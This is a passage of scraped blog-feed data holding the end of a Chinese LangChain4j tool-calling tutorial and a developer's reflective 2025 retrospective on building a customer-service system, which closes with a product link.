真的调用了我们的工具</strong>！</p>\n<p>工具把数据返回给 AI 后，AI 会整理成自然语言：</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/2105804/202601/2105804-20260102134407815-1435969741.png\" /></p>\n<p>在 Debug 模式下，你还能看到 AI Service 加载了工具：</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/2105804/202601/2105804-20260102134818678-1880921390.png\" /></p>\n<p>以及工具的完整调用链路：</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/2105804/202601/2105804-20260102135157469-2000354683.png\" /></p>\n<p><strong>完美运行！</strong></p>\n<h2 id=\"工具定义的两种方式\">工具定义的两种方式</h2>\n<p>前面用的是声明式定义（注解），LangChain4j 也支持编程式定义：</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/2105804/202601/2105804-20260102135244721-1011469314.png\" /></p>\n<p><strong>简单场景用声明式，需要动态创建工具用编程式。</strong></p>\n<h2 id=\"还能做更多\">还能做更多</h2>\n<p>除了搜索，工具调用还能实现这些功能：</p>\n<ul>\n<li>读写本地文件</li>\n<li>生成 PDF 报告</li>\n<li>执行 Shell 命令</li>\n<li>生成图表</li>\n<li>调用企业内部 API</li>\n</ul>\n<p><strong>更棒的是</strong>：这些工具不一定都要自己写，可以通过 MCP（Model Context Protocol）协议直接用别人开发好的工具。</p>\n<h2 id=\"完整的调用链路\">完整的调用链路</h2>\n<p>如果想深入理解工具调用的每一步，看这个时序图就对了：</p>\n<div class=\"mermaid\">sequenceDiagram\n      autonumber\n\n      participant U2 as 🧪 Test(用户)\n      participant B1 as AiCodeHelperService\n      participant L1 as LangChain4j框架\n      participant L2 as ChatModel(LLM)\n      participant B3 as CnblogsArticleTool\n      participant T1 as Jsoup(网页抓取)\n\n      Note over U2,T1: chatWithTools() 测试流程\n\n      U2-&gt;&gt;B1: chat(\"帮我查询博客园用户 BNTang 的最新技术文章...\")\n      B1-&gt;&gt;L1: 转发请求\n      L1-&gt;&gt;L1: 加载 system-prompt.txt\n      L1-&gt;&gt;L1: 添加 ChatMemory(最近10条消息)\n      L1-&gt;&gt;L2: 发送用户消息\n\n      L2-&gt;&gt;L2: 分析意图\n      L2-&gt;&gt;L2: 识别需要调用 cnblogsSearch 工具\n\n      L2--&gt;&gt;L1: 返回工具调用请求\n      L1-&gt;&gt;B3: searchCnblogsArticles(\"BNTang\")\n\n      B3-&gt;&gt;B3: 解析输入参数\n      B3-&gt;&gt;B3: 构造URL (https://www.cnblogs.com/BNTang/)\n\n      B3-&gt;&gt;T1: fetchDocumentWithRetries(url, 3, 8000)\n      T1-&gt;&gt;T1: 发送HTTP请求\n      T1--&gt;&gt;B3: 返回HTML文档\n\n      B3-&gt;&gt;B3: 解析HTML (.day 元素)\n      B3-&gt;&gt;B3: 提取文章信息(标题、链接、日期、摘要等)\n      B3-&gt;&gt;B3: 生成JSON结果\n\n      B3--&gt;&gt;L1: 返回文章列表JSON\n      L1-&gt;&gt;L2: 发送工具结果给LLM\n\n      L2-&gt;&gt;L2: 基于工具结果生成最终回复\n      L2--&gt;&gt;L1: 返回最终答案\n      L1--&gt;&gt;B1: 返回结果\n      B1--&gt;&gt;U2: 返回 String 结果\n\n      U2-&gt;&gt;U2: System.out.println(result)\n</div><p><strong>时序图解读</strong>：</p>\n<ol>\n<li><strong>用户发起请求</strong>（步骤 1-4）：Test 调用 Service，Service 转发给 LangChain4j 框架</li>\n<li><strong>AI 分析意图</strong>（步骤 5-7）：LLM 分析用户问题，决定需要调用 <code>cnblogsSearch</code> 工具</li>\n<li><strong>工具执行</strong>（步骤 8-17）：Tool 用 Jsoup 抓取博客园页面，解析数据</li>\n<li><strong>结果返回</strong>（步骤 18-21）：工具结果返回给 LLM，LLM 生成最终答案</li>\n</ol>\n<p><strong>关键点</strong>：工具执行在应用侧（B3、T1），不在 AI 服务器（L2）。</p>\n<h2 id=\"写在最后\">写在最后</h2>\n<p>工具调用是让 AI 突破能力边界的关键技术。</p>\n<p><strong>记住三个要点</strong>：</p>\n<ol>\n<li>工具描述写清楚，AI 才能正确调用</li>\n<li>工具在应用侧执行，不在 AI 服务器</li>\n<li>声明式定义简单，编程式定义灵活</li>\n</ol>\n<p>通过 LangChain4j 的 <code>@Tool</code> 注解，只需要几行代码，就能让 AI 拥有\"超能力\"。</p>\n<hr />\n<p><strong>系列文章持续更新中，关注我不错过每一篇干货。</strong></p>\n<p><strong>这篇文章对你有用的话，点个赞、在看支持一下吧！</strong></p>\n<hr />\n<p><strong>相关文章推荐</strong>：</p>\n<ul>\n<li><a href=\"https://mp.weixin.qq.com/s/XhmFIeKpJR37AqqLg46b5w\" rel=\"noopener nofollow\" target=\"_blank\">智谱 GLM-4.7 编程第一</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s/8fRzTXtAJ8_IfX2OggGDsw\" rel=\"noopener nofollow\" target=\"_blank\">LangChain4j 结构化输出实战</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s/KtaNzGc3wbVKPwMTVl1z4g\" rel=\"noopener nofollow\" target=\"_blank\">让 AI 不再失忆</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s/pnCbt98Ob4hb8sj9WPVV3g\" rel=\"noopener nofollow\" target=\"_blank\">Claude Code 免费指南</a></li>\n</ul>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-02 15:32</span>&nbsp;\n<a href=\"https://www.cnblogs.com/BNTang\">BNTang</a>&nbsp;\n阅读(<span id=\"post_view_count\">95</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "独立开发者的 2025：我为什么还在做一个“看起来很普通”的客服系统",
      "link": "https://www.cnblogs.com/sheng_chao/p/19431954",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/sheng_chao/p/19431954\" id=\"cb_post_title_url\" title=\"发布于 2026-01-02 15:02\">\n    <span>独立开发者的 2025：我为什么还在做一个“看起来很普通”的客服系统</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        过去几年里，技术社区反复讨论同样几个话题：AI、出海、SaaS、独立开发者。热度在变，说法在升级，但真正把一个系统长期跑起来的人，感受往往更具体也更现实。这篇文章，算是一次不太宏大的回顾——记录我在 2025 年围绕一个客服系统所做的选择、踩过的坑，以及一些被现实反复校正过的认知。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>过去几年里，技术社区反复讨论同样几个话题：AI、出海、SaaS、独立开发者。<br />\n热度在变，说法在升级，但真正把一个系统长期跑起来的人，感受往往更具体也更现实。<br />\n2025 年对我来说，并不是一个有明显拐点的年份，没有爆发式增长，也没有戏剧性转向，只是持续做事、持续暴露问题、持续修正判断的一年。<br />\n这篇文章，算是一次不太宏大的回顾——记录我在 2025 年围绕一个客服系统所做的选择、踩过的坑，以及一些被现实反复校正过的认知。</p>\n<hr />\n<h2 id=\"一2025一个看似普通其实很残酷的一年\">一、2025：一个“看似普通、其实很残酷”的一年</h2>\n<p>如果只看技术社区的热词，2025 年似乎并不特别。<br />\nAI、出海、SaaS、独立开发者，这些词在过去几年里已经被反复讨论，甚至有些“疲劳”。</p>\n<p>但真正身处其中的人，大多能感受到一种很微妙的变化：</p>\n<p><strong>机会并没有消失，但容错率在急剧下降。</strong></p>\n<ul>\n<li>流量不再自然增长</li>\n<li>用户不再愿意“陪你一起成熟”</li>\n<li>技术红利逐步变成工程与耐力的比拼</li>\n</ul>\n<p>你依然可以做产品、写代码、发布版本，但<strong>每一次决策的代价都变得更真实、更不可逆</strong>。</p>\n<hr />\n<h3 id=\"表面平静底层在加速分化\">表面平静，底层在加速分化</h3>\n<p>从外部看，2025 年不像 2020 那样剧烈，也不像 2022 那样充满不确定性。<br />\n但从内部看，它更像是一个<strong>分水岭年份</strong>：</p>\n<ul>\n<li>大厂在收缩战线，只保留“确定性强”的方向</li>\n<li>中小团队开始意识到，靠融资和故事续命越来越难</li>\n<li>独立开发者要么更专业，要么更快放弃</li>\n</ul>\n<p><strong>“能跑起来”已经不算本事，“能活下去”才是。</strong></p>\n<hr />\n<h3 id=\"技术依然重要但不再是护城河本身\">技术依然重要，但不再是护城河本身</h3>\n<p>2025 年我最大的一个感受是：</p>\n<blockquote>\n<p>技术没有贬值，但“只靠技术”的路径，正在快速变窄。</p>\n</blockquote>\n<p>框架在变，模型在升级，工具链越来越完善。<br />\n一个功能，从想法到落地，前所未有地快。</p>\n<p>但这也意味着：</p>\n<ul>\n<li>同质化速度极快</li>\n<li>抄一个“能用的版本”几乎没有门槛</li>\n<li>真正拉开差距的，是长期维护、稳定性、细节和取舍</li>\n</ul>\n<p>很多项目不是死于“做不出来”，<br />\n而是死于 <strong>“做到一半，发现后面的路太长”</strong>。</p>\n<hr />\n<h3 id=\"对独立开发者而言这是清醒的一年\">对独立开发者而言，这是“清醒”的一年</h3>\n<p>如果说前几年还可以抱有某种浪漫幻想，<br />\n那么 2025 年更像是一年集体清醒期：</p>\n<ul>\n<li>你开始认真计算服务器、运维、支持成本</li>\n<li>你意识到每一个“免费用户”都在消耗注意力</li>\n<li>你必须直面一个问题：<strong>这东西有没有人愿意长期用、长期付费</strong></li>\n</ul>\n<p>对我来说，这一年并没有发生什么戏剧性的转折。<br />\n没有爆发式增长，也没有彻底放弃。</p>\n<p>只是逐渐意识到：<br />\n<strong>如果要继续做，就必须把它当成一件长期、甚至有点枯燥的事来对待。</strong></p>\n<hr />\n<h3 id=\"正是在这样的背景下我继续推进了-升讯威在线客服与营销系统\">正是在这样的背景下，我继续推进了 升讯威在线客服与营销系统</h3>\n<p>在 2025 年，我仍然选择把时间投入到一个看起来并不“性感”的方向——客服系统。</p>\n<p>不是因为它新，<br />\n而是因为它<strong>足够现实</strong>：</p>\n<ul>\n<li>足够考验工程能力</li>\n<li>足够暴露产品取舍</li>\n<li>也足够真实地反映“有没有人在用”</li>\n</ul>\n<p>后面的章节，我会具体聊聊这一年里踩过的坑、做过的取舍，以及一些被反复验证过的反直觉结论。</p>\n<p>但所有这些，都源于同一个前提：</p>\n<blockquote>\n<p><strong>2025 年，不再是“试试看”的年份了。</strong></p>\n</blockquote>\n<p>如果你还在做事，大概率和我一样，已经意识到了这一点。</p>\n<hr />\n<h2 id=\"二我为什么在-2025-年还要做一个客服系统\">二、我为什么在 2025 年还要做一个“客服系统”</h2>\n<p>如果只从“赛道选择”的角度看，<br />\n在 2025 年做客服系统，几乎是一个<strong>反直觉</strong>的决定。</p>\n<p>它不新、不酷、不在风口上。<br />\n也很难用一句话讲出“颠覆性”。</p>\n<p>但正因为如此，它反而成了一个非常诚实的选择。</p>\n<hr />\n<h3 id=\"客服系统是一面照妖镜\">客服系统是一面“照妖镜”</h3>\n<p>我一直觉得，客服系统是 SaaS 产品里非常特殊的一类：</p>\n<ul>\n<li>它不解决“增长”，而是暴露问题</li>\n<li>它不创造幻想，而是承接情绪</li>\n<li>它每天面对的，都是系统最真实、最糟糕的状态</li>\n</ul>\n<p>当一切都运转良好时，客服系统几乎是隐形的；<br />\n<strong>只有当别的地方出问题，它才会被频繁打开。</strong></p>\n<p>这意味着两件事：</p>\n<ol>\n<li>它对稳定性和实时性的要求极端苛刻</li>\n<li>它几乎无法靠“营销叙事”掩盖真实体验</li>\n</ol>\n<p><strong>好不好用，用几天就知道。</strong></p>\n<hr />\n<h3 id=\"红海并不等于没问题可解决\">“红海”并不等于“没问题可解决”</h3>\n<p>客服系统常被视为红海产品，但我在实际使用和调研中发现的却是另一种景象：</p>\n<ul>\n<li>功能很多，但长期使用体验割裂</li>\n<li>演示很好看，真实场景却频繁卡壳</li>\n<li>对销售友好，对工程师不友好</li>\n</ul>\n<p>尤其是对中小团队来说，常见的困境是：</p>\n<ul>\n<li>SaaS 版本限制多、定制难</li>\n<li>私有化版本部署复杂、维护成本高</li>\n<li>出了问题，很难快速定位到底是哪一层在出错</li>\n</ul>\n<p><strong>不是没有产品，而是“能安心长期用的产品”不多。</strong></p>\n<hr />\n<h3 id=\"我想验证一件事工程导向能不能做出好产品\">我想验证一件事：工程导向能不能做出好产品</h3>\n<p>在 2025 年继续做客服系统，对我来说更像一次验证，而不是押注。</p>\n<p>我想验证的不是“能不能做成一个大平台”，<br />\n而是一个更具体、也更残酷的问题：</p>\n<blockquote>\n<p>如果从一开始就以工程可控性、可维护性为核心，<br />\n能不能反过来，做出一个真正对用户友好的系统？</p>\n</blockquote>\n<p>这意味着很多不讨巧的选择：</p>\n<ul>\n<li>把时间花在日志、遥测、异常采集上</li>\n<li>花精力设计清晰、可预期的系统边界</li>\n<li>接受“功能慢一点，但稳定优先”的节奏</li>\n</ul>\n<p>这些东西在 Demo 里几乎看不出来，<br />\n但在第 100 次、第 1000 次使用时，会被反复感知。</p>\n<hr />\n<h3 id=\"升讯威在线客服与营销系统-只是这个验证过程的载体\">升讯威在线客服与营销系统 只是这个验证过程的载体</h3>\n<p>在这个过程中，我做了一个叫 <strong>升讯威在线客服与营销系统</strong> 的客服系统。</p>\n<p>但它并不是一个“先定产品、再找用户”的项目，<br />\n更像是一个<strong>长期承载思考和取舍的容器</strong>：</p>\n<ul>\n<li>哪些功能值得做，哪些应该克制</li>\n<li>哪些问题应该由系统解决，哪些必须交还给人</li>\n<li>在 SaaS 和私有化之间，边界应该如何划分</li>\n</ul>\n<p>很多决策，并不是“行业最佳实践”，<br />\n而是一次次被现实逼出来的选择。</p>\n<hr />\n<h3 id=\"为什么是-2025而不是更早或更晚\">为什么是 2025，而不是更早或更晚</h3>\n<p>如果是更早几年，我可能会更激进；<br />\n如果再晚几年，可能会更保守。</p>\n<p>2025 刚好处在一个微妙的位置：</p>\n<ul>\n<li>技术足够成熟，可以把基础问题解决好</li>\n<li>用户足够理性，不再被概念牵着走</li>\n<li>我自己，也已经不再执着于“做一个看起来很厉害的东西”</li>\n</ul>\n<p>而是更在意：</p>\n<blockquote>\n<p><strong>这个系统，在真实世界里，能不能被长期信任。</strong></p>\n</blockquote>\n<p>这就是我在 2025 年，仍然选择做一个客服系统的核心原因。</p>\n<hr />\n<h2 id=\"三2025-年我真正踩过的-5-个坑\">三、2025 年我真正踩过的 5 个坑</h2>\n<p>这一年里，我越来越清楚一件事：</p>\n<blockquote>\n<p>真正决定一个系统能不能“长期活着”的，<br />\n往往不是你最得意的那部分代码。</p>\n</blockquote>\n<p>下面这 5 个坑，都不是概念问题，而是<strong>上线之后、真实使用中反复出现</strong>的问题。</p>\n<hr />\n<h3 id=\"坑一把功能完整误当成系统可用\">坑一：把“功能完整”误当成“系统可用”</h3>\n<p>这是最早、也是最隐蔽的一个坑。</p>\n<p>在开发初期，很容易用 checklist 思维判断进度：</p>\n<ul>\n<li>会话有了</li>\n<li>转接有了</li>\n<li>访客追踪有了</li>\n<li>历史记录能查</li>\n</ul>\n<p><strong>看起来一切都齐了。</strong></p>\n<p>但真正上线后才发现，客服系统的“可用”，并不取决于有没有功能，而取决于：</p>\n<ul>\n<li>高峰期会不会卡</li>\n<li>网络抖动时会不会丢消息</li>\n<li>客服端卡死后能不能恢复</li>\n</ul>\n<p>这些问题，只有在<strong>真实用户、真实压力</strong>下才会暴露。</p>\n<p>后来我不得不承认：<br />\n<strong>客服系统不是功能型产品，而是稳定性型产品。</strong></p>\n<hr />\n<h3 id=\"坑二低估实时系统的复杂度\">坑二：低估“实时系统”的复杂度</h3>\n<p>理论上，一个客服系统就是：</p>\n<blockquote>\n<p>WebSocket + 消息转发 + 状态同步</p>\n</blockquote>\n<p>实际写起来，完全不是一回事。</p>\n<p>只要系统存在：</p>\n<ul>\n<li>多客服</li>\n<li>多会话</li>\n<li>多设备登录</li>\n<li>客服/访客随时上下线</li>\n</ul>\n<p>就必然会遇到这些问题：</p>\n<ul>\n<li>状态不同步</li>\n<li>幽灵会话</li>\n<li>已关闭的连接仍然被认为“在线”</li>\n<li>消息已发送，但对方并未真正接收</li>\n</ul>\n<p>最痛苦的是：<br />\n<strong>这些问题很难稳定复现。</strong></p>\n<p>后来我才真正理解，实时系统的核心不是“快”，<br />\n而是 <strong>状态一致性的收敛能力</strong>。</p>\n<hr />\n<h3 id=\"坑三把日志当成事后工具\">坑三：把日志当成“事后工具”</h3>\n<p>一开始，我也和很多人一样：</p>\n<ul>\n<li>出问题了，再加日志</li>\n<li>定位到了，再删一部分</li>\n</ul>\n<p>直到有一天我意识到：</p>\n<blockquote>\n<p>在客服系统里，如果你需要“复现问题”，<br />\n这个问题本身就已经很严重了。</p>\n</blockquote>\n<p>很多用户反馈的问题，本质是：</p>\n<ul>\n<li>“刚刚还能用，现在不行了”</li>\n<li>“有时候会断”</li>\n<li>“偶尔收不到消息”</li>\n</ul>\n<p>如果没有<strong>结构化、可关联的日志和遥测数据</strong>，<br />\n你根本无法判断问题发生在哪一层。</p>\n<p>从那之后，我开始把日志、异常、遥测当作<strong>系统的一部分</strong>，<br />\n而不是附加模块。</p>\n<hr />\n<h3 id=\"坑四以为-saas-和私有化只是部署方式不同\">坑四：以为 SaaS 和私有化只是“部署方式不同”</h3>\n<p>这是一个非常典型、也非常昂贵的认知错误。</p>\n<p>在早期，我下意识地认为：</p>\n<blockquote>\n<p>SaaS 跑得通，私有化就是“多打个包”。</p>\n</blockquote>\n<p>真正开始支持私有化之后才发现：</p>\n<ul>\n<li>网络环境完全不可控</li>\n<li>依赖服务可能被裁剪</li>\n<li>客户更关心“可诊断性”而不是“自动化”</li>\n</ul>\n<p>很多在 SaaS 下理所当然的假设，在私有化环境中都会失效。</p>\n<p><strong>它们不是同一个产品，只是共享了一部分代码。</strong></p>\n<hr />\n<h3 id=\"坑五忽视非功能需求的长期成本\">坑五：忽视“非功能需求”的长期成本</h3>\n<p>性能、稳定性、可观测性、安全性，<br />\n这些东西在需求评审时，往往排在最后。</p>\n<p>但在客服系统里，它们会以一种非常直接的方式反噬你：</p>\n<ul>\n<li>一次卡顿，就可能造成大量负面体验</li>\n<li>一次异常，客服就会怀疑“是不是系统问题”</li>\n<li>一次数据异常，信任成本要用很久才能修复</li>\n</ul>\n<p>我在 2025 年学到的最重要一课是：</p>\n<blockquote>\n<p><strong>非功能需求不是“以后再补”的东西，<br />\n它们决定了你以后还有没有机会补。</strong></p>\n</blockquote>\n<hr />\n<h2 id=\"四产品层面的-3-个反直觉认知\">四、产品层面的 3 个反直觉认知</h2>\n<p>在 2025 年之前，我对“做产品”这件事，多少还带着一点工程师式的理想主义。<br />\n但真正把一个系统放进长期、真实使用场景后，很多直觉其实是错的。</p>\n<p>下面这 3 个认知，都是踩坑之后才慢慢形成的。</p>\n<hr />\n<h3 id=\"认知一用户真正渴望的不是更多能力而是更少意外\">认知一：用户真正渴望的，不是“更多能力”，而是“更少意外”</h3>\n<p>在做客服系统之前，我也以为：</p>\n<blockquote>\n<p>功能多一点，总是好的。</p>\n</blockquote>\n<p>但真实情况恰恰相反。</p>\n<p>对客服来说，一个“好用”的系统，往往意味着：</p>\n<ul>\n<li>今天和昨天的行为是一致的</li>\n<li>高峰期不会突然变慢</li>\n<li>操作之后的结果是可预期的</li>\n</ul>\n<p>他们并不关心系统“还能不能再多做点事”，<br />\n他们更关心的是：</p>\n<blockquote>\n<p><strong>它会不会在关键时刻出问题。</strong></p>\n</blockquote>\n<p>很多功能一旦进入真实使用场景，就会暴露出维护成本、理解成本、误操作成本。<br />\n这些成本，不会出现在 PRD 里，但会长期存在于用户的心理负担中。</p>\n<hr />\n<h3 id=\"认知二真正能被长期使用的系统往往是没有存在感的\">认知二：真正能被长期使用的系统，往往是“没有存在感”的</h3>\n<p>这是一个很反产品直觉的结论。</p>\n<p>我们习惯于强调：</p>\n<ul>\n<li>易用性</li>\n<li>交互细节</li>\n<li>视觉反馈</li>\n</ul>\n<p>但在客服系统这种<strong>高频、长时间使用</strong>的产品里，<br />\n“存在感”本身，反而是一种负担。</p>\n<p>当系统足够稳定、足够顺滑时，用户甚至不会意识到它在“帮忙”。<br />\n它更像空气或地面——<br />\n<strong>只有消失或出问题时，才会被注意到。</strong></p>\n<p>我后来发现，很多所谓的“高级设计”，<br />\n在长期使用中都会被用户下意识地绕开。</p>\n<hr />\n<h3 id=\"认知三对中小团队来说可控性往往比自动化更重要\">认知三：对中小团队来说，“可控性”往往比“自动化”更重要</h3>\n<p>在产品设计层面，“自动化”听起来永远是正确方向。<br />\n但在真实环境中，它是有前提的。</p>\n<p>对中小团队而言：</p>\n<ul>\n<li>人少，但责任清晰</li>\n<li>出问题时，希望知道“哪里坏了”</li>\n<li>更愿意手动介入，而不是面对黑盒</li>\n</ul>\n<p>这意味着：</p>\n<ul>\n<li>清晰的状态</li>\n<li>可追溯的操作</li>\n<li>可解释的结果</li>\n</ul>\n<p>往往比“全自动”更有价值。</p>\n<p>我在 2025 年最大的转变之一，是开始主动压制某些看起来很“聪明”的设计，<br />\n转而强调：</p>\n<blockquote>\n<p><strong>系统是否让人安心。</strong></p>\n</blockquote>\n<hr />\n<h2 id=\"五2025-年我对-升讯威在线客服与营销系统-的几个关键取舍\">五、2025 年我对 升讯威在线客服与营销系统 的几个关键取舍</h2>\n<p>在前面的章节里，我提到过不少“坑”和认知转变。<br />\n但如果这些东西不能反映到具体决策中，它们就只是感悟。</p>\n<p>2025 年，对 升讯威在线客服与营销系统 来说，不是快速扩张的一年，<br />\n而是一年持续做选择、并且<strong>不断否定“看起来更诱人方案”</strong>的过程。</p>\n<p>下面这几个取舍，基本决定了它今天的形态。</p>\n<hr />\n<h3 id=\"取舍一同时提供-saas-和私有化而不是二选一\">取舍一：同时提供 SaaS 和私有化，而不是二选一</h3>\n<p>这是一个从一开始就很“反效率”的决定。</p>\n<p>从纯开发成本看，<br />\nSaaS + 私有化意味着：</p>\n<ul>\n<li>两套部署逻辑</li>\n<li>更多环境差异</li>\n<li>更高的维护复杂度</li>\n</ul>\n<p>但真实需求非常明确：</p>\n<ul>\n<li>有些团队需要“即开即用”</li>\n<li>有些团队必须“完全可控”</li>\n</ul>\n<p>我不想用一种模式去强迫所有人适应。</p>\n<p>最终的取舍是：<br />\n<strong>共享核心能力，但承认它们是两类不同用户。</strong></p>\n<p>这也直接影响了后面很多架构决策。</p>\n<hr />\n<h3 id=\"取舍二克制功能扩张把精力花在系统边界上\">取舍二：克制功能扩张，把精力花在“系统边界”上</h3>\n<p>在 2025 年，我刻意放慢了新增功能的节奏。</p>\n<p>不是因为没想法，<br />\n而是越来越清楚：</p>\n<blockquote>\n<p>客服系统真正的复杂度，不在功能数量，而在系统边界。</p>\n</blockquote>\n<p>比如：</p>\n<ul>\n<li>哪些状态是“强一致”的</li>\n<li>哪些问题必须在服务端解决</li>\n<li>哪些异常可以交给人工兜底</li>\n</ul>\n<p>这些决定，远比“加一个新功能”更影响长期体验。</p>\n<p>很多时候，我选择<strong>不做</strong>，<br />\n而不是做一个“可能有用”的功能。</p>\n<hr />\n<h3 id=\"取舍三优先工程可诊断性而不是全自动体验\">取舍三：优先工程可诊断性，而不是“全自动体验”</h3>\n<p>这是一个非常工程师导向的选择。</p>\n<p>在 升讯威在线客服与营销系统 中，我把相当一部分精力，<br />\n投入到了普通用户几乎看不到的地方：</p>\n<ul>\n<li>更清晰的日志结构</li>\n<li>更明确的错误分类</li>\n<li>更可追溯的会话和事件链路</li>\n</ul>\n<p>这意味着：</p>\n<ul>\n<li>短期内体验并不会“惊艳”</li>\n<li>但一旦出问题，更容易被定位和解释</li>\n</ul>\n<p>对我来说，这比“自动处理一切”更重要。</p>\n<hr />\n<h3 id=\"取舍四国际化不是加语言包而是提前约束设计\">取舍四：国际化不是“加语言包”，而是提前约束设计</h3>\n<p>在 2025 年，我开始认真推进国际化相关工作。</p>\n<p>但这个过程很快让我意识到：<br />\n国际化并不是后期优化，而是<strong>设计约束</strong>。</p>\n<ul>\n<li>文案长度</li>\n<li>时间与时区</li>\n<li>权限与角色命名</li>\n<li>默认行为假设</li>\n</ul>\n<p>这些一旦在早期写死，后期改动成本会非常高。</p>\n<p>所以在 升讯威在线客服与营销系统 中，<br />\n我宁愿慢一点，也要避免“只为单一市场优化”的捷径。</p>\n<hr />\n<h3 id=\"取舍五把-升讯威在线客服与营销系统-当成一个长期系统而不是可卖的功能集合\">取舍五：把 升讯威在线客服与营销系统 当成一个长期系统，而不是“可卖的功能集合”</h3>\n<p>这是所有取舍背后的底层判断。</p>\n<p>如果目标是尽快卖掉，<br />\n有很多更聪明、更激进的做法。</p>\n<p>但在 2025 年，我更关心的是：</p>\n<ul>\n<li>它能不能在真实环境中稳定跑几年</li>\n<li>它是否经得起不断有人接手、维护</li>\n<li>它会不会在某一天变成“没人敢动的系统”</li>\n</ul>\n<p>这决定了我对技术债、对重构、对节奏的态度。</p>\n<hr />\n<h2 id=\"六2026我打算继续做的-3-件小而确定的事\">六、2026：我打算继续做的 3 件“小而确定的事”</h2>\n<p>如果说 2025 年是一个不断做减法、校正方向的年份，<br />\n那对 2026 年，我反而没有太多宏大的规划。</p>\n<p>不是因为没有野心，<br />\n而是越来越清楚：</p>\n<blockquote>\n<p>在一个长期系统里，<br />\n<strong>真正重要的不是“下一步有多远”，而是“这一步能不能站稳”。</strong></p>\n</blockquote>\n<p>所以在 2026 年，我给自己定下的目标非常克制，只做三件“小而确定”的事。</p>\n<hr />\n<h3 id=\"第一件事把稳定从结果变成能力\">第一件事：把“稳定”从结果，变成能力</h3>\n<p>在 2025 年，稳定更多是一个结果导向的判断：<br />\n“最近没出什么大问题”。</p>\n<p>但到了 2026 年，我希望把它前移，变成一种<strong>系统能力</strong>：</p>\n<ul>\n<li>问题是否能被提前发现</li>\n<li>异常是否有明确归因</li>\n<li>在不同环境下，行为是否可预测</li>\n</ul>\n<p>这意味着我会继续投入在：</p>\n<ul>\n<li>更完整的可观测性</li>\n<li>更明确的系统状态模型</li>\n<li>更保守、但可验证的变更策略</li>\n</ul>\n<p>稳定不应该依赖“经验和小心”，<br />\n而应该来自<strong>结构本身</strong>。</p>\n<hr />\n<h3 id=\"第二件事把国际化真正跑一遍而不是支持一下\">第二件事：把国际化真正跑一遍，而不是“支持一下”</h3>\n<p>在 2025 年，国际化更多是设计层面的准备。<br />\n到了 2026 年，我希望让它进入真实运行状态。</p>\n<p>这包括：</p>\n<ul>\n<li>真正的非中文用户</li>\n<li>真正不同的使用习惯</li>\n<li>真正不同的部署环境</li>\n</ul>\n<p>而不是只停留在“可以切换语言”。</p>\n<p>这一步不一定会带来明显增长，<br />\n但它会非常清楚地暴露：</p>\n<blockquote>\n<p>升讯威在线客服与营销系统 的哪些设计是通用的，<br />\n哪些其实是隐含假设。</p>\n</blockquote>\n<hr />\n<h3 id=\"第三件事更明确地知道谁不适合用-升讯威在线客服与营销系统\">第三件事：更明确地知道“谁不适合用 升讯威在线客服与营销系统”</h3>\n<p>这是一个看起来有些反商业，但我认为非常必要的目标。</p>\n<p>在 2026 年，我希望能更清楚地回答一个问题：</p>\n<ul>\n<li><strong>什么样的团队，用 升讯威在线客服与营销系统 会很舒服</strong></li>\n<li><strong>什么样的团队，用它反而会痛苦</strong></li>\n</ul>\n<p>这包括：</p>\n<ul>\n<li>技术能力与期望的匹配</li>\n<li>对可控性 vs 自动化的偏好</li>\n<li>对私有化与合规的真实需求</li>\n</ul>\n<p>一个产品如果试图取悦所有人，<br />\n最终往往谁都留不住。</p>\n<hr />\n<h2 id=\"七结尾给同样在慢慢做事的人\">七、结尾：给同样在“慢慢做事”的人</h2>\n<p>写到这里，其实已经很清楚了。<br />\n这不是一篇“阶段性胜利”的复盘，也不是某种成功经验。</p>\n<p>它更像是一次记录：<br />\n在一个不再奖励冲动和幻想的阶段，<br />\n一个人如何选择继续把事情做好。</p>\n<hr />\n<p>在 2025 年，我越来越少问自己：</p>\n<ul>\n<li>这个方向是不是风口</li>\n<li>这个产品能不能快速放大</li>\n</ul>\n<p>而是反复确认一些更朴素的问题：</p>\n<ul>\n<li>它是不是在解决真实问题</li>\n<li>它有没有在变得更稳定</li>\n<li>如果明年继续做，我是否还能心安</li>\n</ul>\n<p>很多时候，继续做下去，并不是因为看到了希望，<br />\n而是因为<strong>已经看清了现实，仍然觉得值得</strong>。</p>\n<hr />\n<p>如果你也在做一个进展缓慢、反馈稀疏、很难被外人理解的项目，<br />\n那你大概能体会这种状态：</p>\n<ul>\n<li>每一步都很小</li>\n<li>每一次改动都要反复权衡</li>\n<li>很难兴奋，但也不再轻易动摇</li>\n</ul>\n<p>这并不浪漫，<br />\n但它可能是少数真正可持续的节奏。</p>\n<hr />\n<p>我不确定 升讯威在线客服与营销系统 会走到哪一步，<br />\n也不打算在这里承诺什么结果。</p>\n<p>我能确定的只有一件事：</p>\n<blockquote>\n<p><strong>它至少是按照我能长期负责的方式，被认真对待的。</strong></p>\n</blockquote>\n<p>如果你刚好也在寻找一个<br />\n可控、工程友好、愿意陪你走很久的客服系统，<br />\n你大概能理解我为什么会把它做成现在这个样子。</p>\n<p>项目叫 <strong>升讯威在线客服与营销系统</strong>。</p>\n<p>如果没有，也没关系。<br />\n能在这个阶段，继续慢慢把事做好，本身就已经很难得了。</p>\n<hr />\n<h2 id=\"独立者的产品成果\">独立者的产品成果</h2>\n<blockquote>\n<p><a href=\"https://kf.shengxunwei.com\" rel=\"noopener nofollow\" target=\"_blank\">https://kf.shengxunwei.com</a></p>\n</blockquote>\n<p><strong>可全天候 7 × 24 